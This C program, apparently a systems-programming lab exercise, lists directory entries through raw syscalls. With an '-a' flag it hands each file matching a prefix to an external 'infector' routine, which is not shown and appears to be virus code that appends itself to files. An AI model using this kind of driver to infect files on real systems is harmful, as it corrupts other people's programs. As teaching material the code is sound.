#include "util.h"
#define _GNU_SOURCE
#include <dirent.h>

#define SYS_OPEN 5
#define STS_CLOSE 6
#define SYS_WRITE 4
#define SYS_READ 3
#define SYS_LSEEK 19
#define SYS_GETDENTS 141

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define O_WRONLY 1
#define O_RDONLY 0
#define O_RDRW 2
#define O_CREAT 64
extern int system_call();
extern void infection();
extern void infector();
extern void code_end();
extern void code_start();

typedef struct ent {
    int inode;     /* Inode number */
    int offset;     /* Offset to next linux_dirent */
    short len;  
    char buf[1];  /* Filename (null-terminated) */
   
}ent;

int main (int argc , char* argv[], char* envp[]){

    char prefix;
    int p=0;
    int a=0;
    int j=1;
    while(j < argc){ 
        if(strlen(argv[j])==3 && strncmp(argv[j],"-p",2) == 0){ 
            prefix=*(argv[j]+2);
            p=1;
        } 
            else if(strlen(argv[j])==3 && strncmp(argv[j],"-a",2) == 0){ 
                prefix=*(argv[j]+2);
                a=1;
            } 
                else{
                    system_call(1,0x55);
                }  
        j++;
    }
    char d_type;
    int fd = system_call(SYS_OPEN,".",0,0777);
    char buf[8192];
    ent* entp;
    int i=0;
    int nread = system_call(SYS_GETDENTS,fd,buf,8192);
    if(fd<0||nread<0){
        system_call(1,0x55);
    }

    while(i<nread){

        entp = (ent*)(buf+i);
        d_type=*(buf+i+(entp->len)-1);
        char *type= (d_type == DT_REG) ?  "regular" :
                                        (d_type == DT_DIR) ?  "directory" :
                                        (d_type == DT_FIFO) ? "FIFO" :
                                        (d_type == DT_SOCK) ? "socket" :
                                        (d_type == DT_LNK) ?  "symlink" :
                                        (d_type == DT_BLK) ?  "block dev" :
                                        (d_type == DT_CHR) ?  "char dev" : "";
       
        if(((p||a) && entp->buf[0]==prefix) || (!p && !a) ){
            system_call(SYS_WRITE,STDOUT,entp->buf,strlen(entp->buf));
            system_call(SYS_WRITE,STDOUT," type: " ,7);
            system_call(SYS_WRITE,STDOUT,type,strlen(type));                           
            system_call(SYS_WRITE,STDOUT,"\n",1);
        }
        if(a && entp->buf[0]==prefix){
            infector(entp->buf);

        }
      
        i += entp->len;
    }
    system_call(STS_CLOSE,fd);
    return 0;
}
